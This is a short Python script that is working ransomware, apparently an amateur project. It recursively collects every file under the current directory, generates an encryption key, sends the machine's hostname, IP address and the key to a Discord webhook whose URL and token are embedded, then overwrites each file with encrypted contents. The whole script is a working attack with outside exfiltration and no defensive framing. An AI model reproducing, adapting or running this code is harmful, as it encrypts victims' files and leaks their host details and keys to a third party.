import os
import socket
import requests

from cryptography.fernet import Fernet

files = []
hostname = socket.gethostname()
print(hostname)
ip_address = socket.gethostbyname(hostname)
print(ip_address)


def fill_list(directory):
    for file in os.listdir(directory):
        if os.path.isfile(directory + "/" + file):
            print(f'Detected file: "{directory}/{file}"')
            files.append(directory + "/" + file)
            continue
        fill_list(directory + "/" + file)


for file in os.listdir():
    if file == "ransomeware.py" or file == "decrypt.py" or file == "key.key":
        continue
    if os.path.isfile(file):
        print(f'Detected file: "{file}"')
        files.append(file)
        continue
    fill_list(file)

key = Fernet.generate_key()

webhook_url = "https://canary.discord.com/api/webhooks/1001204636054728744/xT-gZRAA7zb37t_jvIHjMCjBjkQFOO5WaSldpukL5LW3y4V6jHMRlusnDb_8Z7wz0ZxA"

payload = {
  "embeds": [
    {
      "title": hostname,
      "color": 3407616,
      "fields": [
        {
          "name": "IP Adress",
          "value": ip_address
        },
        {
          "name": "Key",
          "value": f"{key}"
        }
      ]
    }
  ],
  "attachments": []
}


requests.post(webhook_url, json=payload)

print(files)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

with open("key.key", "wb") as thefile:
    thefile.write(key)
